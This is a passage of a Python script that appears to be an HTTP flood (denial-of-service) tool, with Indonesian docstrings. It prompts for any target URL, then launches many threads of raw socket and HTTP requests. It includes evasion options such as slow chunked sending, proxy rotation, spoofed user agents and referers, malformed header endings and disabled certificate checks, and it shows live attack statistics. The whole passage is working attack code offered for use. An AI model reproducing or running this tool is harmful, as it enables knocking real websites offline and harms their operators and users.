                content_type_header = current_socket_headers.get("Content-Type","text/plain; charset=utf-8")
                if isinstance(body_payload_content, (dict, list)) and "application/json" in content_type_header:
                    body_str = json.dumps(body_payload_content)
                elif isinstance(body_payload_content, dict) and "application/x-www-form-urlencoded" in content_type_header:
                    body_str = urlencode(body_payload_content)
                else:
                    body_str = str(body_payload_content)
                raw_body_bytes = body_str.encode('utf-8', errors='surrogateescape') 
                current_socket_headers['Content-Length'] = str(len(raw_body_bytes))
            
            for h_key, h_val in current_socket_headers.items():
                raw_req_lines.append(f"{h_key}: {str(h_val)}")
            if attack_intensity == "high" or strategy == "header_focused": 
                if "User-Agent" in current_socket_headers and random.random() < 0.4:
                    raw_req_lines.append(f"UserAgent: {current_socket_headers['User-Agent']}") 
                if random.random() < 0.3:
                    raw_req_lines.append(f"Referer: {current_socket_headers.get('Referer','http://google.com/')}") 

            raw_request_header_part = "\r\n".join(raw_req_lines) + "\r\n" 
            if (attack_intensity == "high" or strategy == "aggressive_payload") and random.random() < 0.3:
                raw_request_header_part += random.choice(["\r\n", "\n", "\r\n\t\r\n"])
            else:
                raw_request_header_part += "\r\n"
            
            raw_request_bytes = raw_request_header_part.encode('utf-8', errors='surrogateescape') + raw_body_bytes

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout_val) 
            if sock_port == 443:
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT) 
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                if attack_intensity == "high" and (strategy == "header_focused" or strategy == "stealth"):
                    try: 
                        context.set_ciphers('ECDHE+AESGCM:CHACHA20:AES256-SHA:AES128-SHA:@SECLEVEL=1') 
                    except ssl.SSLError:
                        pass 
                sock = context.wrap_socket(sock, server_hostname=sock_host)
            sock.connect((sock_host, sock_port))
            
            send_iterations = 1
            if attack_strategy == "aggressive_payload" and http_socket_method in ['POST','PUT','PATCH']:
                send_iterations = random.randint(1,5) 

            for _ in range(send_iterations):
                if (attack_intensity == "high" or strategy == "stealth") and random.random() < 0.7 and len(raw_request_bytes)>10:
                    bytes_sent_count = 0
                    while bytes_sent_count < len(raw_request_bytes):
                        chunk_size = random.randint(1, 5 if attack_intensity=="high" else 15) 
                        chunk = raw_request_bytes[bytes_sent_count : bytes_sent_count + chunk_size]
                        if not chunk:
                            break 
                        sock.sendall(chunk)
                        bytes_sent_count += len(chunk)
                        sleep(random.uniform(0.0001, 0.02 if attack_intensity=="high" else 0.05)) 
                else:
                    sock.sendall(raw_request_bytes)
            sock.close()
            update_stats(sent=1)

    except requests.exceptions.Timeout: update_stats(error_type="timeout")
    except requests.exceptions.ProxyError: update_stats(error_type="proxy")
    except requests.exceptions.ConnectionError: update_stats(error_type="connection")
    except requests.exceptions.RequestException: update_stats(error_type="http_error_req") 
    except httpx.TimeoutException: update_stats(error_type="timeout_httpx")
    except httpx.ProxyError: update_stats(error_type="proxy_httpx")
    except httpx.ConnectError: update_stats(error_type="connection_httpx")
    except httpx.RequestError: update_stats(error_type="http_error_httpx") 
    except (socket.timeout, ssl.SSLError, ssl.SSLWantReadError, ssl.SSLWantWriteError, ConnectionResetError, BrokenPipeError): 
        update_stats(error_type="socket_conn_ssl_timeout") 
    except socket.error as e: 
        update_stats(error_type=f"socket_error_{e.errno if hasattr(e, 'errno') else 'unknown'}")
    except Exception: 
        update_stats(error_type="other_thread_exception")


# --- Thread Workers and Signal Handler ---
def attack_thread_worker(url, method, target_details):
    """Fungsi yang dijalankan oleh setiap thread serangan."""
    while not stop_event.is_set():
        execute_flood(url, method, target_details)

def monitor_thread_worker(target_ip, target_port): 
    """Thread untuk memonitor dan menampilkan statistik serangan."""
    start_time = time.time()
    last_sent_count = 0
    last_time = start_time
    while not stop_event.is_set():
        sleep(1) 
        if stop_event.is_set(): 
            break
        
        with lock: 
            current_sent = stats["sent"]
            current_errors_copy = dict(stats["errors"]) 
            current_status_codes_copy = dict(stats["status_codes"])
        
        now = time.time()
        interval_time = now - last_time
        if interval_time == 0: 
            interval_time = 1 
        
        rps = (current_sent - last_sent_count) / interval_time
        
        last_sent_count = current_sent
        last_time = now
        
        error_summary = ", ".join([f"{k}: {v}" for k,v in current_errors_copy.items() if v > 0])
        status_summary = ", ".join([f"HTTP_{k}: {v}" for k,v in sorted(current_status_codes_copy.items())])
        
        output_line = (
            f"\r{Fore.CYAN} {next(spinner)} "
            f"{Fore.WHITE}Sent: {Fore.GREEN}{current_sent} "
            f"{Fore.MAGENTA}RPS: {rps:.2f} "
            f"{Fore.BLUE}Target: {target_ip}:{target_port} "
            f"{Fore.RED}Errors: [{error_summary if error_summary else 'None'}] "
            f"{Fore.YELLOW}Status: [{status_summary if status_summary else 'N/A'}]"
            f"{Style.RESET_ALL}    "
        )
        sys.stdout.write(output_line)
        sys.stdout.flush()

def signal_handler(sig, frame): 
    """Menangani sinyal interupsi (Ctrl+C) untuk menghentikan skrip dengan bersih."""
    print(f"\n{Fore.YELLOW}[INFO] Shutdown signal received. Stopping threads...")
    stop_event.set()

# --- Main Execution ---
if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler) 
    
    cleargui()
    print(XBanner)
    
    dinamicsgui("Loading User Agents")
    useragent = docloader(UA_FILE)
    dinamicsgui("Loading Proxies")
    proxychain_initial = docloader(PROXY_FILE, is_proxy_list=True)
    if proxychain_initial:
        good_proxies.extend(proxychain_initial)
        print(f"{Fore.GREEN}[INFO]{Fore.RESET} Loaded {len(good_proxies)} proxies.")
    else:
        print(f"{Fore.YELLOW}[WARN]{Fore.RESET} No proxies loaded or {PROXY_FILE} not found/empty. Attack will run direct.")
    
    dinamicsgui("Loading Referers")
    referer = docloader(REFERER_FILE)
    
    print(f'{Fore.GREEN} [!] User Agents: {Fore.MAGENTA}{len(useragent)} {Fore.GREEN} Proxies: {Fore.YELLOW}{len(good_proxies)} {Fore.GREEN} Referers: {Fore.MAGENTA}{len(referer)}')

    target_url = "" 
    while True: 
        target_url = input(f"\n{Back.RED}{Fore.BLACK}TARGET URL{Back.RESET}{Fore.BLUE} ➜{Fore.YELLOW} ").strip()
        if not check_url_format(target_url):
            print(f"\n{Back.RED}{Fore.BLACK}[-]{Back.RESET}{Fore.RED} Invalid URL format. Include scheme (http/https).")
            continue
        if initial_url_check(target_url):
            break 
        else:
            if input(f"{Fore.YELLOW}Target check failed. Continue anyway? (y/N): {Fore.RESET}").lower() != 'y':
                target_url = "" 
            else:
                print(f"{Fore.YELLOW}[WARN] Proceeding with target despite initial check failure.{Fore.RESET}")
                break 
    if not target_url: 
        print(f"{Fore.RED}No valid target URL provided. Exiting.")
        exit()

    target_details = {} 
    try: 
        parsed_target = urlparse(target_url)
        target_details["host"] = parsed_target.hostname
        if not target_details["host"]: 
            raise ValueError("Hostname could not be derived from URL.")
        target_details["ip"] = socket.gethostbyname(target_details["host"])
        target_details["port"] = parsed_target.port or (443 if parsed_target.scheme == "https" else 80)
    except Exception as e:
        print(f"{Fore.RED}[ERR]{Fore.RESET} URL/Hostname error: {e}")
        exit()

    intensity_options = {"1": "low", "2": "medium", "3": "high"} 
    while True:
        print(f"\n{Back.CYAN}{Fore.BLACK}SELECT ATTACK INTENSITY (more evasions, complex payloads){Back.RESET}")
        for k_intensity, v_intensity in intensity_options.items():
            print(f"{k_intensity}. {v_intensity.capitalize()}")
        choice = input(f"{Fore.GREEN}Intensity ➜ {Fore.YELLOW}")
        if choice in intensity_options:
            attack_intensity = intensity_options[choice]
            break
        else:
            print(f"{Fore.RED}Invalid intensity choice.")

    strategy_options = {"1": "default", "2": "stealth", "3": "aggressive_payload", "4": "header_focused"}
    while True:
        print(f"\n{Back.GREEN}{Fore.BLACK}SELECT ATTACK STRATEGY{Back.RESET}")
        print(f"{Fore.WHITE}1. Default (Balanced approach based on intensity)")
        print(f"{Fore.WHITE}2. Stealth (Try to mimic legitimate traffic, smaller payloads, less noisy headers)")
        print(f"{Fore.WHITE}3. Aggressive Payload (Focus on large/complex/problematic payloads)")
        print(f"{Fore.WHITE}4. Header Focused (Focus on diverse and evasive HTTP headers)")
        choice = input(f"{Fore.GREEN}Strategy ➜ {Fore.YELLOW}")
        if choice in strategy_options:
            attack_strategy = strategy_options[choice]
            break
        else:
            print(f"{Fore.RED}Invalid strategy choice.")

    method_types = ["GET", "POST", "PUT", "JSON", "HEAD", "DELETE", "PATCH", "HTTPX", "JSON_HTTPX", "HTTPFlood"] 
    attack_type = "" 
    while True:
        print(f"\n{Back.BLUE}{Fore.BLACK}SELECT ATTACK TYPE{Back.RESET}")
        for i, m in enumerate(method_types, start=1):
            print(f"{Fore.WHITE}{i}. {Fore.GREEN}{m}")
        choice = input(f"\n{Back.MAGENTA}{Fore.BLACK}SELECT MODE{Back.RESET}{Fore.GREEN} ➜ {Fore.YELLOW}")
        if choice.isdigit() and 1 <= int(choice) <= len(method_types):
            attack_type = method_types[int(choice) - 1]
            break
        else:
            print(f"\n{Back.RED}{Fore.BLACK}[!]{Back.RESET}{Fore.MAGENTA} Invalid Mode ➜ {Fore.YELLOW}{choice}")
    
    threads_count = 0 
    while True:
        try:
            threads_count_input = input(f"{Back.BLUE}{Fore.BLACK}[?]{Back.RESET}{Fore.BLUE}Thread Count ➜ {Fore.YELLOW}")
            if not threads_count_input: 
                 print(f"{Fore.RED}Thread count cannot be empty.")
                 continue
            threads_count = int(threads_count_input)
            if threads_count > 0:
                break
            else:
                print(f"{Fore.RED}Thread count must be positive.")
        except ValueError:
            print(f"{Fore.RED}Invalid number for threads.")
    
    print(f"\n{Back.YELLOW}{Fore.BLACK}[!]{Back.RESET}{Fore.RED} Preparing to attack {Fore.GREEN}{target_url}{Fore.YELLOW} ({target_details['ip']})")
    print(f"{Fore.RED}Intensity: {Fore.CYAN}{attack_intensity.capitalize()}{Fore.YELLOW}, Strategy: {Fore.CYAN}{attack_strategy.capitalize()}{Fore.YELLOW}, Threads: {Fore.MAGENTA}{threads_count}{Fore.YELLOW}, Method: {Fore.GREEN}{attack_type}{Fore.YELLOW}")
    if input(f"{Fore.CYAN}Confirm to start? (Y/n): {Fore.RESET}").lower() == 'n':
        print(f"{Fore.YELLOW}Attack cancelled.")
        exit()

    print(f"{Fore.GREEN}Starting attack... Press Ctrl+C to stop.{Fore.RESET}")
    monitor_thread = threading.Thread(target=monitor_thread_worker, args=(target_details['ip'], target_details['port']), daemon=True)
    monitor_thread.start()
    
    threads = []
    attack_start_time_main = time.time() 
    for i in range(threads_count):
        if stop_event.is_set(): 
            break 
        thread = threading.Thread(target=attack_thread_worker, args=(target_url, attack_type, target_details), daemon=True)
        threads.append(thread)
        thread.start()
        if i > 0 and i % 50 == 0 and i < threads_count -1 : 
            sleep(0.05)

    try:
        while not stop_event.is_set():
            if threads_count > 0 and not any(t.is_alive() for t in threads) and \
               time.time() - attack_start_time_main > 10 and stats["sent"] < threads_count : 
                print(f"\n{Fore.RED}[WARN] All worker threads appear to have stopped prematurely. Possible widespread errors or target actively blocking.")
                stop_event.set() 
            sleep(1) 
    except KeyboardInterrupt: 
        print(f"\n{Fore.YELLOW}[INFO] KeyboardInterrupt in main loop. Stopping...")
        stop_event.set()

    print(f"\n{Fore.YELLOW}[INFO] Waiting for threads to finish (max 5s)...")
    if monitor_thread.is_alive(): 
        monitor_thread.join(timeout=2.0) 
    
    for t in threads:
        if t.is_alive():
            t.join(timeout=0.1) 

    sleep(0.1) 
    cleargui()
    print(XBanner) 
    print(f"{Fore.GREEN}Attack Finished/Stopped: {target_url}{Fore.RESET}")
    
    with lock:
        total_sent = stats["sent"]
        total_errors = sum(stats["errors"].values())
        print(f"{Fore.CYAN}Total Sent: {Fore.GREEN}{total_sent}")
        print(f"{Fore.CYAN}Total Errors: {Fore.RED}{total_errors}")
        if total_errors > 0:
            print(f"{Fore.RED}Error Breakdown:")
            for k_error, v_error in stats["errors"].items(): 
                if v_error > 0:
                    print(f"  - {k_error}: {v_error}")
        print(f"{Fore.CYAN}Status Code Breakdown:")
        if stats["status_codes"]:
            for code, count in sorted(stats["status_codes"].items()):
                print(f"  - HTTP {code}: {count}")
        else:
            print("  - No status codes recorded.")
    print(f"{Fore.YELLOW}Exiting.")
